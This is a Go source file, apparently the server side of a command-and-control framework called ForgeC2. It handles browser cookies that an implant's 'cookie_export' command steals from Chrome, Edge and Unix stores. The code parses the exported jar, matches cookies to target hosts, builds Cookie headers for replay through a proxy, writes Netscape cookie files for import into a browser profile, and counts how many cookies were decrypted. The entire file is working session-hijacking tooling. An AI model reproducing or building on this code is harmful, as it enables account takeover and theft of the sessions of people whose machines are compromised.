package server

import (
	"encoding/json"
	"fmt"
	"net"
	"strconv"
	"strings"
)

// cookieJarEntry is the JSON shape written by implant cookie_export
// (Windows Chrome/Edge ABE + Unix stores).
type cookieJarEntry struct {
	Domain   string `json:"domain"`
	Name     string `json:"name"`
	Path     string `json:"path"`
	Value    string `json:"value"`
	Expires  int64  `json:"expires"`
	Secure   bool   `json:"secure,omitempty"`
	HTTPOnly bool   `json:"httpOnly,omitempty"`
}

// parseCookieExport pulls the JSON cookie jar from cookie_export output.
// Falls back to TSV lines when the JSON block is missing (older implants).
func parseCookieExport(output string) []cookieJarEntry {
	if output == "" {
		return nil
	}
	if idx := strings.Index(output, "=== JSON ==="); idx >= 0 {
		raw := strings.TrimSpace(output[idx+len("=== JSON ==="):])
		if end := strings.Index(raw, "\n==="); end >= 0 {
			raw = raw[:end]
		}
		var jars []cookieJarEntry
		if err := json.Unmarshal([]byte(strings.TrimSpace(raw)), &jars); err == nil && len(jars) > 0 {
			return jars
		}
	}
	var jars []cookieJarEntry
	for _, line := range strings.Split(output, "\n") {
		line = strings.TrimSpace(line)
		if line == "" || strings.HasPrefix(line, "===") || strings.HasPrefix(line, "---") {
			continue
		}
		parts := strings.Split(line, "\t")
		if len(parts) < 4 {
			continue
		}
		entry := cookieJarEntry{Domain: parts[0], Name: parts[1], Path: parts[2]}
		for _, p := range parts[3:] {
			if strings.HasPrefix(p, "expires=") {
				n, _ := strconv.ParseInt(strings.TrimPrefix(p, "expires="), 10, 64)
				entry.Expires = n
			} else if strings.HasPrefix(p, "secure=") {
				entry.Secure = strings.TrimPrefix(p, "secure=") != "0"
			} else if strings.HasPrefix(p, "value=") {
				entry.Value = strings.TrimPrefix(p, "value=")
			}
		}
		if entry.Name != "" {
			jars = append(jars, entry)
		}
	}
	return jars
}

// cookieMatchesHost reports whether a cookie domain applies to host
// (leading-dot suffix match, Chrome-style).
func cookieMatchesHost(cookieDomain, host string) bool {
	d := strings.TrimPrefix(strings.ToLower(strings.TrimSpace(cookieDomain)), ".")
	h := strings.ToLower(strings.TrimSpace(host))
	if h == "" || d == "" {
		return false
	}
	if colon := strings.LastIndex(h, ":"); colon > 0 {
		if _, err := strconv.Atoi(h[colon+1:]); err == nil {
			h = h[:colon]
		}
	}
	if ip := net.ParseIP(h); ip != nil {
		return h == d
	}
	return h == d || strings.HasSuffix(h, "."+d)
}

func cookieHeaderForHost(jars []cookieJarEntry, host string) string {
	var parts []string
	seen := map[string]struct{}{}
	for _, c := range jars {
		if c.Name == "" || strings.HasPrefix(c.Value, "[") {
			// Skip failed decrypts like [v20-decrypt-failed].
			continue
		}
		if !cookieMatchesHost(c.Domain, host) {
			continue
		}
		key := c.Name
		if _, ok := seen[key]; ok {
			continue
		}
		seen[key] = struct{}{}
		parts = append(parts, c.Name+"="+c.Value)
	}
	return strings.Join(parts, "; ")
}

// chromeExpiryUnix converts Chrome's microseconds-since-1601 expires_utc
// to a Unix timestamp. Zero/negative stays 0 (session cookie).
func chromeExpiryUnix(expires int64) int64 {
	if expires <= 0 {
		return 0
	}
	const epochDiff int64 = 11644473600
	sec := expires/1_000_000 - epochDiff
	if sec < 0 {
		return 0
	}
	return sec
}

func netscapeCookieFile(jars []cookieJarEntry) string {
	var b strings.Builder
	b.WriteString("# Netscape HTTP Cookie File\n")
	b.WriteString("# ForgeC2 isolated cookie jar — import into a dedicated browser profile.\n")
	b.WriteString("# HTTPS cookie injection via this proxy is CONNECT-tunnel only (no MITM).\n")
	for _, c := range jars {
		if c.Name == "" {
			continue
		}
		domain := c.Domain
		flag := "FALSE"
		if strings.HasPrefix(domain, ".") {
			flag = "TRUE"
		} else if domain != "" && net.ParseIP(strings.TrimPrefix(domain, ".")) == nil {
			flag = "TRUE"
			domain = "." + domain
		}
		path := c.Path
		if path == "" {
			path = "/"
		}
		secure := "FALSE"
		if c.Secure {
			secure = "TRUE"
		}
		exp := chromeExpiryUnix(c.Expires)
		fmt.Fprintf(&b, "%s\t%s\t%s\t%s\t%d\t%s\t%s\n", domain, flag, path, secure, exp, c.Name, c.Value)
	}
	return b.String()
}

func cookieJarStats(jars []cookieJarEntry) (n int, decrypted int) {
	n = len(jars)
	for _, c := range jars {
		if c.Value != "" && !strings.HasPrefix(c.Value, "[") {
			decrypted++
		}
	}
	return n, decrypted
}
